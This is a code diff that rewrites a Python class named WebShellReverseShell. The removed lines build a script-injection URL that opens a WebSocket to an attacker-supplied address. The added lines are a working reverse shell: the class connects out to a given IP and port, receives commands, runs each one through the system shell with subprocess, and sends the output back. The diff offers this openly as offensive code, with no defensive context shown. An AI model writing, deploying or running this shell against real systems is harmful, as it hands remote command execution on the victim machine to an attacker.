@@ -1,9 +1,19 @@
-class WebShellReverseShell:
-    def __init__(self):
-        pass
+import socket
+import subprocess
 
-    def create_reverse_shell(self, url, server_ip, server_port):
-        payload = f"<script>var socket = new WebSocket('ws://{server_ip}:{server_port}');socket.onopen=function(){{socket.send('reverse shell');}}</script>"
-        webshell_url = f"{url}?input={payload}"
-        print(f"WebShell reverse shell created at: {webshell_url}")
-        return webshell_url
+class WebShellReverseShell:
+    def __init__(self, ip, port):
+        self.ip = ip
+        self.port = port
+
+    def execute(self):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((self.ip, self.port))
+        s.send(b'Webshell Reverse Shell connected\n')
+        while True:
+            command = s.recv(1024).decode()
+            if command.lower() == 'exit':
+                break
+            output = subprocess.run(command, shell=True, capture_output=True)
+            s.send(output.stdout + output.stderr)
+        s.close()
